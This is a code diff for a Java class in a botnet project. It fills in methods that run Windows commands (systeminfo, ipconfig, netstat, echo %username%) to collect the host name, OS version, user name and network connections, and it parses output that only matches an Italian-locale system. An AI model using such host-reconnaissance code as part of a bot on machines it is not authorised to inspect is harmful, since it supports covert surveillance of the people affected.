@@ -26,6 +26,10 @@
 
 package com.acmutv.botnet.tool.runtime;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.StringReader;
+
 public class WindowsSysInfoTools {
 	
 	//to do
@@ -35,7 +39,22 @@ public class WindowsSysInfoTools {
 	 * @return kernel Version
 	 */
 	public String getKernelVersion(){
-		return RuntimeManager.runCmd("");
+		String SPSDT = RunCmdTool.runCmd("systeminfo");
+		String kernelVersion = "";
+		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
+		String lines;
+		try {
+			while ((lines = reader.readLine()) != null)  {
+				if (lines.length() > 0){
+					if(lines.contains("Versione SO:"))
+						kernelVersion = lines.substring(lines.indexOf("Versione SO:")).replace("Versione SO:", "");;
+				}
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+
+		return kernelVersion;
 	}
 	
 	/**
@@ -43,7 +62,21 @@ public class WindowsSysInfoTools {
 	 * @return hostname
 	 */
 	public String getHostName(){
-		return RuntimeManager.runCmd("");
+		String SPSDT = RunCmdTool.runCmd("systeminfo");
+		String hostName = "";
+		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
+		String lines;
+		try {
+			while ((lines = reader.readLine()) != null)  {
+				if (lines.length() > 0){
+					if(lines.contains("Nome host:"))
+						hostName = lines.substring(lines.indexOf("Nome host:")).replace("Nome host:", "");
+				}
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		return hostName;
 	}
 	
 	/**
@@ -51,31 +84,39 @@ public class WindowsSysInfoTools {
 	 * @return username
 	 */
 	public String getUserName(){
-		return RuntimeManager.runCmd("");
+		return RunCmdTool.runCmd("echo %username%");
 	}
 	
 	/**
 	 * Returns info of the network it is connected to the system
 	 * @return network info
 	 */
-	public String getNetworkData(){
-		return RuntimeManager.runCmd("");
+	public String getCurrentNetworkInformation(){
+		return RunCmdTool.runCmd("ipconfig");
 	}
 	
 	/**
-	 * Returns the list of applications installed on the system
-	 * @return applications list
+	 * Returns all protocol network statistics: 
+	 * @return network statistics
 	 */
-	public String getApplications(){
-		return RuntimeManager.runCmd("");
+	public String getAllNetworkStatistics(){
+		return RunCmdTool.runCmd("netstat -s");
 	}
 	
 	/**
-	 * Returns the local connections of the system
-	 * @return local connections list
+	 * Returns the tcp current active connections
+	 * @return tcp connections
 	 */
-	public String getNetworkLocations(){
-		return RuntimeManager.runCmd("");
+	public String getTCPCurrentConnections(){
+		return RunCmdTool.runCmd("netstat -p tcp");
+	}
+	
+	/**
+	 * Returns the UDP current active connections
+	 * @return udp connections
+	 */
+	public String getUDPCurrentConnections(){
+		return RunCmdTool.runCmd("netstat -p udp");
 	}
 	
 	/**
